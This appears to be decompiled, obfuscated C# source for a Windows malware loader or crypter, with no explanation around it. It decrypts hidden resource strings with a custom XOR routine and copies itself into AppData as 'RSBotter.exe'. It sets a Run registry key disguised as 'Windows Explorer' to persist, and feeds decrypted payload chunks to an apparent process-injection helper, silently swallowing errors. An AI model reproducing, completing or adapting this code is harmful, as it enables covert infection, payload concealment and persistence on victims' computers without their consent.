using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace CHZuomDOVaZyAsG;

public class uJtoCBlGJVtRtSADngGSdtEVYhiCoS
{
	public delegate IntPtr lGXGXtukevAkpxs(IntPtr ZpuGeliGQtaifMQ, IntPtr UJQDCKqMYQkkErP, uint EtXjwnFxxzyWQUN, uint dtNoALYjapICvQT, uint aDqbMGlVqDpmtee);

	public delegate uint RhNnFAXIYVVMJyr(IntPtr ZpuGeliGQtaifMQ, IntPtr OySlMSwqPdGkWUN);

	public delegate int khcNpWphILVTtbL(IntPtr ZpuGeliGQtaifMQ, IntPtr OySlMSwqPdGkWUN, IntPtr KkGEyUFPhhSvwKm, uint yFfWzjKleaDnzXf, IntPtr vobBTfFNFjjJKdT);

	public delegate int hJpjtVOtpkoXZLc(IntPtr wZFDEbfatDZYCDU, IntPtr HfSbKEtUQhTRyMr);

	public delegate int HKKMlthAjvCaeBK(IntPtr wZFDEbfatDZYCDU, IntPtr HfSbKEtUQhTRyMr);

	public delegate uint HCHmNmwAfvvONDa(IntPtr wZFDEbfatDZYCDU, IntPtr zZhkDEHWternHYT);

	private static string[] tCNiYHsJblpWlTCvURNlLgBdoaeypv = new string[1] { "WIWYsUNkLDhAvxAswLFe" };

	private static string tItQDPekUTlCeuChiLsCnqOcglaJUX = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string[] DTuFRGDtpMtJXUaibgzgRtgLjdTqKs;

	private static byte[] smethod_0(byte[] PtqWpriyDWDOwFlCtUcXjTjNglNIwO, byte[] MoJWWXtbEJaCCDCdVzAFKZoNjWlBQe)
	{
		byte[] array = (byte[])PtqWpriyDWDOwFlCtUcXjTjNglNIwO.Clone();
		for (int i = 0; i < 5; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				array[j] = (byte)(array[j] ^ MoJWWXtbEJaCCDCdVzAFKZoNjWlBQe[j % MoJWWXtbEJaCCDCdVzAFKZoNjWlBQe.Length]);
				for (int k = 0; k < MoJWWXtbEJaCCDCdVzAFKZoNjWlBQe.Length; k++)
				{
					array[j] = (byte)(array[j] ^ (((MoJWWXtbEJaCCDCdVzAFKZoNjWlBQe[k] << i) ^ k) + j));
				}
			}
		}
		return array;
	}

	public static string smethod_1(string DycPkqezJnirqtWGqFlcqniQeNaWNZ, string MRlAgAANsnYuQnwsJVQCGErNNqrlKv)
	{
		byte[] bytes = smethod_0(smethod_2(DycPkqezJnirqtWGqFlcqniQeNaWNZ), smethod_2(MRlAgAANsnYuQnwsJVQCGErNNqrlKv));
		return Encoding.Default.GetString(bytes);
	}

	private static byte[] smethod_2(string piMJArgOlvfCmXdVwUsKeeglsiAxMP)
	{
		return Encoding.Default.GetBytes(piMJArgOlvfCmXdVwUsKeeglsiAxMP);
	}

	private static void Main(string[] args)
	{
		smethod_3();
	}

	public static void smethod_3()
	{
		ResourceManager resourceManager = new ResourceManager("KoCXULKPcyOXldE", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("pawcuYyC");
		string string2 = resourceManager.GetString("jDovqZP");
		string string3 = resourceManager.GetString("eVghl");
		string string4 = resourceManager.GetString("ZDqXJd");
		resourceManager.GetString("kAXudKAAe");
		resourceManager.GetString("BRlRrm");
		string string5 = resourceManager.GetString("LttGptQn");
		string mRlAgAANsnYuQnwsJVQCGErNNqrlKv = "''#%*($!$')'#%%!$''%!)%)(";
		@string = smethod_1(@string, mRlAgAANsnYuQnwsJVQCGErNNqrlKv);
		string2 = smethod_1(string2, mRlAgAANsnYuQnwsJVQCGErNNqrlKv);
		string3 = smethod_1(string3, mRlAgAANsnYuQnwsJVQCGErNNqrlKv);
		string4 = smethod_1(string4, mRlAgAANsnYuQnwsJVQCGErNNqrlKv);
		string5 = smethod_1(string5, mRlAgAANsnYuQnwsJVQCGErNNqrlKv);
		DTuFRGDtpMtJXUaibgzgRtgLjdTqKs = string5.Split(new char[1] { '|' });
		string executablePath = Application.get_ExecutablePath();
		if (!executablePath.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
		{
			byte[] bytes = File.ReadAllBytes(executablePath);
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RSBotter.exe");
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, bytes);
			}
		}
		if (@string != string.Empty)
		{
			executablePath = DTuFRGDtpMtJXUaibgzgRtgLjdTqKs[0];
			string[] array = @string.Split(tCNiYHsJblpWlTCvURNlLgBdoaeypv, StringSplitOptions.RemoveEmptyEntries);
			foreach (string piMJArgOlvfCmXdVwUsKeeglsiAxMP in array)
			{
				try
				{
					KNYqhErWUEtJsNrXjNEkMOvYLiTIFM.smethod_0(smethod_2(piMJArgOlvfCmXdVwUsKeeglsiAxMP), executablePath);
				}
				catch
				{
				}
			}
		}
		smethod_5();
	}

	private static int smethod_4(int QHbvmQzpanmqinwjtLOpPhNUWMwbEM, int OhOsqESohGDdsvFCpECiQqMbDIUhyz)
	{
		Random random = new Random();
		return random.Next(QHbvmQzpanmqinwjtLOpPhNUWMwbEM, OhOsqESohGDdsvFCpECiQqMbDIUhyz);
	}

	private static void smethod_5()
	{
		string name = "Windows Explorer";
		string name2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		try
		{
			string value = tItQDPekUTlCeuChiLsCnqOcglaJUX + "\\RSBotter.exe";
			Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(name, value);
		}
		catch
		{
		}
	}

	public static T smethod_6<T>(string sxKoxfAOWSrgDiKLOrpsxRyvVytMPG, string KLOHngteYAbzIKRKLErRUCRgbAZotZ)
	{
		IntPtr pwfVxrXSnDSsQIXdbfBGtMbBiTdgFT = KNYqhErWUEtJsNrXjNEkMOvYLiTIFM.LoadLibraryA(sxKoxfAOWSrgDiKLOrpsxRyvVytMPG);
		IntPtr procAddress = KNYqhErWUEtJsNrXjNEkMOvYLiTIFM.GetProcAddress(pwfVxrXSnDSsQIXdbfBGtMbBiTdgFT, KLOHngteYAbzIKRKLErRUCRgbAZotZ);
		return (T)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T));
	}
}
